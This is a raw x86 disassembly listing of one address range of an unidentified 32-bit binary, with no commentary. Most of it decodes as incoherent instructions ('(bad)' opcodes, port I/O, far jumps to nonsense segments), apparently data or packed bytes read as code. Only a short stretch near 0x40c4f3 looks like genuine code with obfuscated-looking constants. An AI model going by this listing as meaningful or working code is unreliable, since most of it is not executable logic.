  40c059:	mov    ds:0xb09f8679,eax
  40c05e:	jl     0x40c00b
  40c060:	jo     0x40c0a1
  40c062:	and    eax,0x81e07768
  40c067:	inc    edx
  40c068:	dec    esp
  40c069:	mov    cl,dh
  40c06b:	push   0x120517e0
  40c070:	ret    0x65df
  40c073:	mov    edi,0xbeee202d
  40c078:	(bad)  
  40c07a:	fwait
  40c07b:	hlt    
  40c07c:	or     bh,BYTE PTR [ebp+0x3e]
  40c07f:	fimul  WORD PTR [eax-0x2b]
  40c082:	inc    eax
  40c083:	jg     0x40c0f9
  40c085:	(bad)  [edi+0x7330049c]
  40c08b:	rcl    BYTE PTR [ebp+0x5f],cl
  40c08e:	mov    ss,WORD PTR [esp+eiz*8+0x73]
  40c092:	dec    BYTE PTR [eax+0x8]
  40c095:	arpl   WORD PTR [edi],cx
  40c097:	into   
  40c098:	pop    ebp
  40c099:	sti    
  40c09a:	mov    esi,0x3b044582
  40c09f:	dec    edx
  40c0a0:	cli    
  40c0a1:	in     eax,dx
  40c0a2:	fs dec edi
  40c0a4:	das    
  40c0a5:	call   0x432b:0x2cea2666
  40c0ac:	push   esp
  40c0ad:	mov    ecx,0xfc6c726
  40c0b2:	std    
  40c0b3:	das    
  40c0b4:	xchg   BYTE PTR [edx],bl
  40c0b6:	pop    ds
  40c0b7:	(bad)  
  40c0b9:	out    0xe8,eax
  40c0bb:	xor    eax,0x369a63a1
  40c0c0:	les    ebp,FWORD PTR [esi+0x4e]
  40c0c3:	ss repz icebp 
  40c0c6:	aas    
  40c0c7:	mov    esi,0xfdc39efb
  40c0cc:	mov    ebx,0xffd167e2
  40c0d1:	test   eax,0xe7b8c3f2
  40c0d6:	scas   al,BYTE PTR es:[edi]
  40c0d7:	lea    eax,[ebx]
  40c0d9:	stc    
  40c0da:	add    edx,ecx
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	shr    cl,1
  40c0ee:	push   ebp
  40c0ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0f0:	call   0x7970:0x7e7e8ade
  40c0f7:	jle    0x40c177
  40c0f9:	test   DWORD PTR [edi-0x65],edi
  40c0fc:	mov    dl,0x9d
  40c0fe:	das    
  40c0ff:	xchg   edx,eax
  40c100:	add    bh,ah
  40c102:	jnp    0x40c0c7
  40c104:	pusha  
  40c105:	fcom   QWORD PTR [ebp+0x319914ae]
  40c10b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c10d:	inc    eax
  40c10e:	imul   esp,DWORD PTR [eax],0x3d
  40c111:	sub    ch,0x91
  40c114:	push   es
  40c115:	jl     0x40c0f9
  40c117:	cmp    bh,BYTE PTR [edi+ebp*1+0x1]
  40c11b:	jno    0x40c0fc
  40c11d:	popf   
  40c11e:	rcr    dl,0x73
  40c121:	mov    al,0x55
  40c123:	dec    ebx
  40c124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c125:	xor    ebx,DWORD PTR [esi+0x576998ed]
  40c12b:	jmp    0x40c0bf
  40c12d:	mov    eax,ds:0x66293399
  40c132:	test   al,0xe3
  40c134:	ins    DWORD PTR es:[edi],dx
  40c135:	jp     0x40c15e
  40c137:	xchg   BYTE PTR [edx],ah
  40c139:	sub    esp,DWORD PTR [ecx-0x208fcf60]
  40c13f:	sbb    al,0x4
  40c141:	mov    ch,0xa2
  40c143:	jge    0x40c0ee
  40c145:	xor    al,0xb1
  40c147:	push   cs
  40c148:	adc    BYTE PTR [esi+0x55],ah
  40c14b:	and    edx,DWORD PTR [ebx-0x9b2f711]
  40c151:	jmp    0x40c1ae
  40c153:	call   0xd586bb3a
  40c158:	cmp    ebp,edi
  40c15a:	xchg   esi,eax
  40c15b:	std    
  40c15c:	jle    0x40c1a6
  40c15e:	addr16 inc eax
  40c160:	(bad)  
  40c162:	in     al,0x8d
  40c164:	js     0x40c172
  40c166:	xchg   edi,eax
  40c167:	fild   WORD PTR [eax+eax*2-0x1c2f01ed]
  40c16f:	pop    ebx
  40c170:	pushf  
  40c171:	mov    edx,0xf7943106
  40c176:	push   ds
  40c177:	xor    al,0x18
  40c179:	push   cs
  40c17a:	mov    WORD PTR [ebx-0x37],ds
  40c17d:	add    BYTE PTR [edx+0x2d1d3b3e],al
  40c183:	int3   
  40c184:	inc    esi
  40c185:	sub    DWORD PTR [ecx-0x59417a7e],0xffffffb7
  40c18c:	or     DWORD PTR [esi],ebp
  40c18e:	cmp    eax,0xa88c20d4
  40c193:	fucomp st(1)
  40c195:	mov    ds:0xb373509b,eax
  40c19a:	rcr    DWORD PTR [esp+ecx*2-0x36],0x1d
  40c19f:	(bad)  
  40c1a0:	mov    al,ds:0xc4dacaca
  40c1a5:	fild   QWORD PTR [eax+0x73]
  40c1a8:	shl    al,0x1e
  40c1ab:	and    BYTE PTR [edx],0x68
  40c1ae:	or     DWORD PTR [edx+0x59],edi
  40c1b1:	xchg   ecx,eax
  40c1b2:	push   cs
  40c1b3:	js     0x40c17e
  40c1b5:	push   esi
  40c1b6:	retf   0x76dd
  40c1b9:	test   DWORD PTR [ecx],ebp
  40c1bb:	ins    BYTE PTR es:[edi],dx
  40c1bc:	ss cld 
  40c1be:	jbe    0x40c1d2
  40c1c0:	test   BYTE PTR [ecx-0x59193682],dh
  40c1c6:	stos   DWORD PTR es:[edi],eax
  40c1c7:	push   ecx
  40c1c8:	mov    dl,0x16
  40c1ca:	mov    dl,0x4a
  40c1cc:	hlt    
  40c1cd:	adc    al,0xfa
  40c1cf:	fiadd  WORD PTR [esp+ebx*4+0x4a]
  40c1d3:	mov    cl,0xf8
  40c1d5:	jne    0x40c232
  40c1d7:	out    0xac,al
  40c1d9:	or     BYTE PTR [ebx-0x625b20f9],dl
  40c1df:	cmp    eax,0x6c7f414
  40c1e4:	sbb    eax,0xabc2ab96
  40c1e9:	into   
  40c1ea:	adc    ebp,DWORD PTR [ebx]
  40c1ec:	jmp    0xe795:0x33d36b75
  40c1f3:	test   BYTE PTR [ebp+0x3dacd4bd],ch
  40c1f9:	xchg   DWORD PTR [esi+0x12],ebx
  40c1fc:	cs ds das 
  40c1ff:	push   edi
  40c200:	add    DWORD PTR [esi],ebp
  40c202:	js     0x40c22e
  40c204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c205:	mov    cl,0xa2
  40c207:	(bad)  
  40c208:	js     0x40c270
  40c20a:	fs mov esi,0x27918f52
  40c210:	icebp  
  40c211:	loopne 0x40c24f
  40c213:	bound  edi,QWORD PTR [eax+0x53]
  40c216:	ds scas eax,DWORD PTR es:[edi]
  40c218:	jmp    0xb4cb1b60
  40c21d:	push   eax
  40c21e:	jl     0x40c248
  40c220:	inc    ebp
  40c221:	sub    BYTE PTR [edi-0x6579495f],cl
  40c227:	ss out 0xb0,eax
  40c22a:	cli    
  40c22b:	pop    esp
  40c22c:	fist   DWORD PTR [eax+0x5b4dd22b]
  40c232:	pop    edx
  40c233:	out    dx,eax
  40c234:	mov    ds:0x2b8ab965,al
  40c239:	adc    eax,0x2a011b2
  40c23e:	sbb    eax,DWORD PTR [esi+ecx*2-0x1301e75c]
  40c245:	add    bh,BYTE PTR [esi-0x4]
  40c248:	pop    ss
  40c249:	icebp  
  40c24a:	sbb    esp,DWORD PTR [esi+0x47]
  40c24d:	push   esp
  40c24e:	rol    DWORD PTR [ebx],cl
  40c250:	ret    
  40c251:	shr    ecx,1
  40c253:	jmp    0xd268cfcf
  40c258:	xlat   BYTE PTR ds:[ebx]
  40c259:	cmp    DWORD PTR ds:0xc052ae4a,ecx
  40c25f:	jmp    0x1a04:0xc383
  40c265:	or     BYTE PTR [ecx+0x4a],ch
  40c268:	fcomp  DWORD PTR [edi+0x53]
  40c26b:	cmp    eax,0x6c229be6
  40c270:	inc    BYTE PTR [esi-0x22]
  40c273:	les    edi,FWORD PTR [edi]
  40c275:	cmp    al,0xf
  40c277:	popa   
  40c278:	sbb    BYTE PTR [esi+0x4e864b3c],0x8d
  40c27f:	jo     0x40c21f
  40c281:	in     al,0x46
  40c283:	xor    al,0x60
  40c285:	sbb    BYTE PTR [esi+0x7142d23],dh
  40c28b:	stos   DWORD PTR es:[edi],eax
  40c28c:	ror    edx,1
  40c28e:	mov    edi,?
  40c290:	cld    
  40c291:	repnz xor dh,al
  40c294:	imul   esp,ecx,0x74b46f5a
  40c29a:	(bad)  
  40c29b:	pop    ds
  40c29c:	ss inc ebx
  40c29e:	ficomp WORD PTR [ebx-0x12]
  40c2a1:	in     eax,0x2
  40c2a3:	sbb    eax,0x3e1467ce
  40c2a8:	test   dh,al
  40c2aa:	mov    edx,0x9b5be654
  40c2af:	dec    esi
  40c2b0:	pop    ebp
  40c2b1:	(bad)  
  40c2b2:	rcl    edi,1
  40c2b4:	jo     0x40c2bf
  40c2b6:	sbb    al,0x7
  40c2b8:	pop    ecx
  40c2b9:	fiadd  DWORD PTR [eax+0x33]
  40c2bc:	lods   eax,DWORD PTR ds:[esi]
  40c2bd:	and    dh,bl
  40c2bf:	ret    
  40c2c0:	sbb    al,ch
  40c2c2:	push   es
  40c2c3:	loope  0x40c2a3
  40c2c5:	into   
  40c2c6:	gs mov ecx,0x3ddea378
  40c2cc:	sar    DWORD PTR [esi+edx*2],cl
  40c2cf:	outs   dx,BYTE PTR ds:[esi]
  40c2d0:	adc    BYTE PTR [esi+0x666b253a],0xe1
  40c2d7:	dec    ebp
  40c2d8:	in     al,0x5d
  40c2da:	mov    dh,0x6c
  40c2dc:	repz loope 0x40c326
  40c2df:	inc    esi
  40c2e0:	dec    edi
  40c2e1:	aam    0xac
  40c2e3:	bound  esi,QWORD PTR ds:0xb02fe1d4
  40c2e9:	mul    BYTE PTR [edi+edx*4+0x47a03fb9]
  40c2f0:	aam    0x51
  40c2f2:	sbb    ebp,ebp
  40c2f4:	xor    al,BYTE PTR [ebp+0x1c]
  40c2f7:	das    
  40c2f8:	lds    eax,FWORD PTR [eax]
  40c2fa:	jae    0x40c330
  40c2fc:	aam    0xc1
  40c2fe:	xchg   ebp,eax
  40c2ff:	std    
  40c300:	push   0xf2024d12
  40c305:	call   FWORD PTR [eax-0x1]
  40c308:	push   ds
  40c309:	mov    al,0x42
  40c30b:	dec    ebx
  40c30c:	mov    ebp,0x9de2382d
  40c311:	cmp    DWORD PTR [eax-0x6a],ecx
  40c314:	fisttp WORD PTR [eax]
  40c316:	enter  0x2fd3,0xc4
  40c31a:	out    dx,eax
  40c31b:	xchg   esi,eax
  40c31c:	jmp    0xe49c:0xa28014e7
  40c323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c324:	ret    0x4f86
  40c327:	push   eax
  40c328:	jl     0x40c357
  40c32a:	outs   dx,DWORD PTR ds:[esi]
  40c32b:	outs   dx,BYTE PTR ds:[esi]
  40c32c:	dec    esi
  40c32d:	out    dx,al
  40c32e:	out    0x97,eax
  40c330:	mov    esp,0x4575145f
  40c335:	inc    esi
  40c336:	dec    esp
  40c337:	retf   
  40c338:	inc    eax
  40c339:	sub    cl,BYTE PTR [eax]
  40c33b:	(bad)
  40c33f:	push   0x2b
  40c341:	jmp    0xda180a49
  40c346:	push   ecx
  40c347:	mov    ch,0xf0
  40c349:	hlt    
  40c34a:	test   eax,0x7ed90585
  40c34f:	push   edx
  40c350:	jae    0x40c30c
  40c352:	clc    
  40c353:	xlat   BYTE PTR ds:[ebx]
  40c354:	sub    al,0x8
  40c356:	or     eax,0x53042673
  40c35b:	jge    0x40c384
  40c35d:	lods   al,BYTE PTR ds:[esi]
  40c35e:	or     al,0xb8
  40c360:	or     dl,BYTE PTR [ecx+0x49bb47b8]
  40c366:	xchg   BYTE PTR [edx],bh
  40c368:	pop    ecx
  40c369:	inc    ecx
  40c36a:	mov    esp,0xa3ddbd3a
  40c36f:	and    eax,0x2958b661
  40c374:	pop    es
  40c375:	or     al,0xa7
  40c377:	pop    edx
  40c378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c379:	dec    ecx
  40c37a:	pusha  
  40c37b:	in     al,0x67
  40c37d:	push   edi
  40c37e:	mov    ds:0x9a7e4d62,al
  40c383:	or     DWORD PTR [eax+0x30c827e8],ebp
  40c389:	pop    esp
  40c38a:	push   ds
  40c38b:	or     dl,al
  40c38d:	fnsave [edi-0x621c3956]
  40c393:	push   edi
  40c394:	mov    edi,0xfd74fa3b
  40c399:	pop    esp
  40c39a:	out    0x47,eax
  40c39c:	sti    
  40c39d:	sbb    BYTE PTR [ebx-0xf8c2edc],dh
  40c3a3:	ins    BYTE PTR es:[edi],dx
  40c3a4:	pop    edx
  40c3a5:	retf   
  40c3a6:	pop    DWORD PTR [edi]
  40c3a8:	mov    edi,0x4b441cd
  40c3ad:	cmp    ebx,DWORD PTR [ebx+0x76]
  40c3b0:	mov    eax,0xd2b81276
  40c3b5:	mov    al,ds:0x45d8a667
  40c3ba:	xlat   BYTE PTR ds:[ebx]
  40c3bb:	in     eax,0x24
  40c3bd:	cmp    esp,DWORD PTR [ebp+0x69]
  40c3c0:	sub    edx,DWORD PTR [ecx+0x7a]
  40c3c3:	ds (bad) 
  40c3c5:	sbb    al,0xc4
  40c3c7:	mov    bl,0xe0
  40c3c9:	js     0x40c437
  40c3cb:	xor    ah,BYTE PTR [edi-0x30f8605d]
  40c3d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3d2:	loopne 0x40c406
  40c3d4:	mov    edx,0xb81bfeb7
  40c3d9:	cmp    BYTE PTR [ebp-0x66],bh
  40c3dc:	push   edi
  40c3dd:	fwait
  40c3de:	stos   BYTE PTR es:[edi],al
  40c3df:	cmp    ebx,DWORD PTR [esi]
  40c3e1:	aaa    
  40c3e2:	inc    ebp
  40c3e3:	fdivrp st(6),st
  40c3e5:	out    0x7b,al
  40c3e7:	pop    ds
  40c3e8:	cmp    ah,bl
  40c3ea:	and    DWORD PTR [ebx+eax*8],esp
  40c3ed:	lods   al,BYTE PTR ds:[esi]
  40c3ee:	inc    edx
  40c3ef:	xor    bl,0x28
  40c3f2:	xchg   ebp,eax
  40c3f3:	and    ebx,DWORD PTR [eax+0x3bd8f537]
  40c3f9:	stos   DWORD PTR es:[edi],eax
  40c3fa:	pop    edx
  40c3fb:	addr16 fwait
  40c3fd:	loopne 0x40c47b
  40c3ff:	shl    ch,0x15
  40c402:	dec    edi
  40c403:	mov    DWORD PTR [ebx+0xd],ebx
  40c406:	js     0x40c476
  40c408:	dec    ebp
  40c409:	in     eax,dx
  40c40a:	xor    BYTE PTR [esi+0x42],dh
  40c40d:	(bad)  
  40c40f:	mov    ah,0xe4
  40c411:	push   ds
  40c412:	loopne 0x40c3aa
  40c414:	ret    
  40c415:	retf   0xecf2
  40c418:	in     eax,dx
  40c419:	mov    esi,0xd5ff1297
  40c41e:	mov    ecx,0x946cc49c
  40c423:	adc    al,BYTE PTR [ecx]
  40c425:	rol    DWORD PTR [ebp-0x428b81a5],0x76
  40c42c:	cmp    DWORD PTR [eax+ecx*8],0x3e
  40c430:	xchg   ebp,eax
  40c431:	dec    eax
  40c432:	push   edi
  40c433:	iret   
  40c434:	xor    al,0xb3
  40c436:	sub    ebp,ebx
  40c438:	ins    DWORD PTR es:[edi],dx
  40c439:	dec    edi
  40c43a:	and    BYTE PTR [esi],dh
  40c43c:	push   edx
  40c43d:	cli    
  40c43e:	xchg   ecx,eax
  40c43f:	pop    ds
  40c440:	jmp    DWORD PTR [edi+0x1e158e3c]
  40c446:	fcom   QWORD PTR [edx+0x6f9c5b7e]
  40c44c:	push   DWORD PTR [edi]
  40c44e:	add    cl,BYTE PTR [edx+esi*1-0x35e945ed]
  40c455:	xor    al,0xe5
  40c457:	inc    esp
  40c458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c459:	fnstsw WORD PTR [edi]
  40c45b:	ss retf 0x1e5d
  40c45f:	pop    ebp
  40c460:	ss push es
  40c462:	sub    BYTE PTR [eax+0x1cbae5c3],dl
  40c468:	ja     0x40c483
  40c46a:	and    cl,bl
  40c46c:	into   
  40c46d:	imul   edi,esp,0xffffffb0
  40c470:	cmp    eax,0x63acb316
  40c475:	retf   0x2426
  40c478:	mov    dh,BYTE PTR [edx]
  40c47a:	dec    ecx
  40c47b:	xor    DWORD PTR [edi+0x6b],esp
  40c47e:	dec    edi
  40c47f:	rcl    dh,0x2e
  40c482:	mov    edx,0x890a6c5a
  40c487:	jp     0x40c4fe
  40c489:	repnz cli 
  40c48b:	sub    dh,ah
  40c48d:	xor    al,0x21
  40c48f:	in     al,0x62
  40c491:	gs cmp al,al
  40c494:	push   ebp
  40c495:	cs fwait
  40c497:	icebp  
  40c498:	sbb    BYTE PTR [ebx-0x629f9be2],0xa5
  40c49f:	add    eax,0x75215297
  40c4a4:	mov    dh,0xd7
  40c4a6:	dec    esi
  40c4a7:	jbe    0x40c44d
  40c4a9:	iret   
  40c4aa:	test   edx,ebx
  40c4ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4ad:	pop    es
  40c4ae:	pop    esi
  40c4af:	or     esi,DWORD PTR ds:0x2de0dfed
  40c4b5:	(bad)  
  40c4b6:	adc    ecx,DWORD PTR [esi+0x6e94af17]
  40c4bc:	push   esi
  40c4bd:	push   0xffffffbb
  40c4bf:	mov    al,dl
  40c4c1:	mov    ch,0xd0
  40c4c3:	mov    edi,0x9d47702f
  40c4c8:	data16 mov al,ds:0x41fc7a29
  40c4ce:	std    
  40c4cf:	out    0xa0,eax
  40c4d1:	in     eax,dx
  40c4d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4d3:	popa   
  40c4d4:	push   edi
  40c4d5:	jp     0x40c4ff
  40c4d7:	pop    ebp
  40c4d8:	fcomp  QWORD PTR [ebp+0x170144ba]
  40c4de:	dec    esi
  40c4e0:	mov    eax,0x2c5c798b
  40c4e5:	popf   
  40c4e6:	pop    ss
  40c4e7:	add    DWORD PTR [edi+0xd],0x741e08d7
  40c4ee:	stc    
  40c4ef:	ins    DWORD PTR es:[edi],dx
  40c4f0:	adc    bl,bh
  40c4f2:	push   edx
  40c4f3:	imul   edx,edi
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	int    0xb8
  40c541:	repz pop edx
  40c543:	rcl    BYTE PTR [esi+0x79707e7e],1
  40c549:	jle    0x40c5c9
  40c54b:	das    
  40c54c:	les    ebx,FWORD PTR [edi]
  40c54e:	rol    DWORD PTR [ecx-0x24796a4a],0x40
  40c555:	in     eax,dx
  40c556:	xchg   esp,eax
  40c557:	shl    DWORD PTR [eax+0x5699e4d5],1
  40c55d:	sub    BYTE PTR [ecx+0xc63411e],ch
  40c563:	mov    esi,0x49eb7a80
  40c568:	inc    ebx
  40c569:	inc    ebp
  40c56a:	jno    0x40c4f0
  40c56c:	test   DWORD PTR [esp+ebp*2+0x39],eax
  40c570:	sub    eax,0x3fa21f65
  40c575:	sub    al,0xd4
  40c577:	shl    ecx,0x94
  40c57a:	pop    ds
  40c57b:	jo     0x40c5cf
  40c57d:	push   0xffffffe7
  40c57f:	test   BYTE PTR [edi+0x45ea9121],bh
  40c585:	inc    esp
  40c586:	sub    eax,0x47e381b4
  40c58b:	ror    ch,cl
  40c58d:	dec    ebx
  40c58e:	adc    eax,0x3c242f9b
  40c593:	iret   
  40c594:	and    eax,0xc41ad980
  40c599:	jb     0x40c5db
  40c59b:	sti    
  40c59c:	add    bh,cl
  40c59e:	jge    0x40c520
  40c5a0:	je     0x40c58e
  40c5a2:	xchg   ebx,eax
  40c5a3:	pop    ss
  40c5a4:	sbb    DWORD PTR [ebx],ecx
  40c5a6:	cmp    eax,0xaf250a0a
  40c5ab:	sbb    esi,DWORD PTR [ebx-0x5c35685c]
  40c5b1:	arpl   WORD PTR [ebx-0x27],di
  40c5b4:	(bad)  
  40c5b5:	adc    ah,BYTE PTR [edi+0x7325b914]
  40c5bb:	push   esp
  40c5bc:	call   0x10c4:0x5b56eb1
  40c5c3:	outs   dx,BYTE PTR ds:[esi]
  40c5c4:	pop    edx
  40c5c5:	xchg   edi,eax
  40c5c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5c7:	mov    edi,0xcdbd65ef
  40c5cc:	call   0xabae6a36
  40c5d1:	jecxz  0x40c57b
  40c5d3:	cli    
  40c5d4:	lea    ecx,[edi+0x27]
  40c5d7:	mov    dl,ch
  40c5d9:	fst    QWORD PTR [eax+0x4e3339e4]
  40c5df:	aad    0x33
  40c5e1:	call   0x650a8aff
  40c5e6:	xchg   ecx,eax
  40c5e7:	dec    eax
  40c5e8:	lea    ecx,[edi+0x3f]
  40c5eb:	push   ecx
  40c5ec:	jnp    0x40c580
  40c5ee:	popf   
  40c5ef:	ret    
  40c5f0:	stc    
  40c5f1:	test   al,bh
  40c5f3:	aas    
  40c5f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5f5:	pop    ecx
  40c5f6:	sub    edx,DWORD PTR [ecx-0x4]
  40c5f9:	sub    esp,DWORD PTR [ecx]
  40c5fb:	xchg   esi,eax
  40c5fc:	dec    ecx
  40c5fd:	in     eax,0x35
  40c5ff:	push   ebp
  40c600:	icebp  
  40c601:	xor    al,dh
  40c603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c604:	fdiv   QWORD PTR [eax+0x7c]
  40c607:	pop    ecx
  40c608:	pop    ds
  40c609:	dec    ecx
  40c60a:	mov    ebx,DWORD PTR [esi-0x1f4f39ab]
  40c610:	jecxz  0x40c598
  40c612:	into   
  40c613:	scas   eax,DWORD PTR es:[edi]
  40c614:	adc    ah,BYTE PTR [edx+0x47]
  40c617:	mov    ebx,ebx
  40c619:	fs or  esi,esp
  40c61c:	inc    eax
  40c61d:	add    DWORD PTR [eax-0x31],ecx
  40c620:	or     esi,DWORD PTR [ebx+0xf]
  40c623:	shl    BYTE PTR [edi+0x48f7458a],1
  40c629:	pusha  
  40c62a:	sub    ch,ah
  40c62c:	lods   al,BYTE PTR ds:[esi]
  40c62d:	mov    esi,0x5f7119c1
  40c632:	stos   DWORD PTR es:[edi],eax
  40c633:	fidiv  WORD PTR [edx]
  40c635:	push   esi
  40c636:	mov    WORD PTR [ebx],ds
  40c638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c639:	ins    DWORD PTR es:[edi],dx
  40c63a:	aad    0x97
  40c63c:	push   eax
  40c63d:	mov    cl,0xfa
  40c63f:	xchg   ebp,eax
  40c640:	pop    eax
  40c641:	out    0xde,al
  40c643:	popa   
  40c644:	mov    ch,0x75
  40c646:	stos   DWORD PTR es:[edi],eax
  40c647:	xchg   DWORD PTR [ebx+0x11bc0dd9],ecx
  40c64d:	mov    edx,0x73c4953b
  40c652:	(bad)  
  40c653:	and    ebx,DWORD PTR [edi+0x1132345c]
  40c659:	xor    ebx,DWORD PTR [edi+0x37]
  40c65c:	nop
  40c65d:	dec    eax
  40c65e:	inc    ebp
  40c65f:	aaa    
  40c660:	dec    eax
  40c661:	cmp    eax,0x3a43ee92
  40c666:	aam    0x9c
  40c668:	mov    dl,BYTE PTR [eax]
  40c66a:	aad    0x54
  40c66c:	xchg   esi,eax
  40c66d:	in     eax,dx
  40c66e:	push   edi
  40c66f:	push   ss
  40c670:	ss lock stc 
  40c673:	mov    ecx,0xedd373d0
  40c678:	iret   
  40c679:	pop    esp
  40c67a:	xchg   edx,eax
  40c67b:	xchg   ebp,eax
  40c67c:	push   ds
  40c67d:	ins    DWORD PTR es:[edi],dx
  40c67e:	adc    ecx,esi
  40c680:	xchg   DWORD PTR [ecx],edx
  40c682:	push   esi
  40c683:	call   0x6d9e7242
  40c688:	cmp    edi,edi
  40c68a:	es pop edx
  40c68c:	int    0xc9
  40c68e:	mov    cl,0x1b
  40c690:	mov    esi,0x575bffa6
  40c695:	lods   al,BYTE PTR ds:[esi]
  40c696:	shl    bl,0xd4
  40c699:	mov    edx,0xb6bb07d6
  40c69e:	out    dx,eax
  40c69f:	adc    al,0x9
  40c6a1:	scas   al,BYTE PTR es:[edi]
  40c6a2:	sar    BYTE PTR [edi],cl
  40c6a4:	jecxz  0x40c6a3
  40c6a6:	aas    
  40c6a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6a9:	lahf   
  40c6aa:	cwde   
  40c6ab:	xchg   edx,eax
  40c6ac:	sbb    eax,0x2fe709db
  40c6b1:	leave  
  40c6b2:	or     BYTE PTR [ebx],al
  40c6b4:	adc    DWORD PTR [esi+0xd],esp
  40c6b7:	div    BYTE PTR [edi+0x6e18bb8f]
  40c6bd:	into   
  40c6be:	jle    0x40c704
  40c6c0:	aad    0xb7
  40c6c2:	xchg   esi,eax
  40c6c3:	rcl    BYTE PTR [ebx+0xa],cl
  40c6c6:	pop    esp
  40c6c7:	test   al,0x3b
  40c6c9:	iret   
  40c6ca:	jle    0x40c685
  40c6cc:	imul   esp,DWORD PTR es:0x14ae6dc2,0x68
  40c6d4:	adc    ch,BYTE PTR [ebp-0x1c474b09]
  40c6da:	int    0x1c
  40c6dc:	xor    eax,0x59d81157
  40c6e1:	rcl    edx,0x9e
  40c6e4:	rcl    ecx,0xc9
  40c6e7:	mov    edi,0x99408842
  40c6ec:	gs or  al,0xd4
  40c6ef:	jb     0x40c715
  40c6f1:	dec    eax
  40c6f2:	or     BYTE PTR [eax+0x60],dh
  40c6f5:	push   edi
  40c6f6:	or     WORD PTR [esi],0xc0e1
  40c6fb:	js     0x40c683
  40c6fd:	nop
  40c6fe:	mov    bh,0xdb
  40c700:	sub    eax,DWORD PTR [edx+0x39df1c69]
  40c706:	push   ds
  40c707:	push   esp
  40c708:	mov    eax,ds:0xf7e3aa6d
  40c70d:	mov    esi,0x44544721
  40c712:	cmp    BYTE PTR [edx],bl
  40c714:	data16 sbb BYTE PTR [ebp+0x2c],dh
  40c718:	mul    BYTE PTR [ebx]
  40c71a:	add    eax,0x754afaa1
  40c71f:	arpl   bp,sp
  40c721:	lds    esp,FWORD PTR [ebx+0x5f76728c]
  40c727:	xor    ebp,DWORD PTR [ecx+0x751f172f]
  40c72d:	jae    0x40c733
  40c72f:	loopne 0x40c76c
  40c731:	lea    edx,ds:0xab5b8e54
  40c737:	hlt    
  40c738:	fwait
  40c739:	xchg   ebp,eax
  40c73a:	in     eax,0x18
  40c73c:	xchg   edx,eax
  40c73d:	scas   eax,DWORD PTR es:[edi]
  40c73e:	(bad)  
  40c73f:	fdiv   st,st(6)
  40c741:	jmp    0xa1da:0x64b297a2
  40c748:	inc    ebx
  40c749:	sar    DWORD PTR [ecx],cl
  40c74b:	imul   edi,DWORD PTR [eax+0x11784456],0xd87288bc
  40c755:	nop
  40c756:	xchg   ebx,eax
  40c757:	ret    0x5b9
  40c75a:	adc    eax,0x5a38f8cc
  40c75f:	mov    ds:0xcbdf7371,eax
  40c764:	fs pop es
  40c766:	inc    eax
  40c767:	iret   
  40c768:	stc    
  40c769:	icebp  
  40c76a:	iret   
  40c76b:	das    
  40c76c:	or     cl,al
  40c76e:	test   BYTE PTR [esi-0x75],cl
  40c771:	mov    ah,BYTE PTR [eax-0x235cc137]
  40c777:	mov    edi,0xb329ac23
  40c77c:	int    0xe4
  40c77e:	jb     0x40c718
  40c780:	or     eax,0xb58c83cd
  40c785:	lahf   
  40c786:	ds sahf 
  40c788:	stc    
  40c789:	mov    esp,0x72a4546c
  40c78e:	push   ebp
  40c78f:	(bad)  
  40c790:	mov    dh,0xa
  40c792:	and    eax,0x8777a81c
  40c797:	mov    bh,0x75
  40c799:	ja     0x40c79d
  40c79b:	push   ebx
  40c79c:	or     bh,BYTE PTR [esi]
  40c79e:	pop    es
  40c79f:	rcr    dh,0x6b
  40c7a2:	rol    BYTE PTR [edi+0x129fe66c],1
  40c7a8:	retf   0xc257
  40c7ab:	test   al,0xa0
  40c7ad:	xchg   esi,eax
  40c7ae:	repnz aas 
  40c7b0:	jmp    0xea0a:0x19f1d5ff
  40c7b7:	mov    ecx,0x7554fe67
  40c7bc:	out    0x8a,al
  40c7be:	push   ebx
  40c7bf:	mov    dh,BYTE PTR [ebx-0x6d50475d]
  40c7c5:	ins    BYTE PTR es:[edi],dx
  40c7c6:	jb     0x40c7f2
  40c7c8:	mov    al,ds:0xe3466d05
  40c7cd:	test   al,0x86
  40c7cf:	push   esi
  40c7d0:	cmp    dl,BYTE PTR [eax]
  40c7d2:	fs mov ebp,0x2e312062
  40c7d8:	mov    cl,0xda
  40c7da:	mov    esp,0x9cc5e861
  40c7df:	pop    esp
  40c7e0:	and    eax,0x3d4afc1c
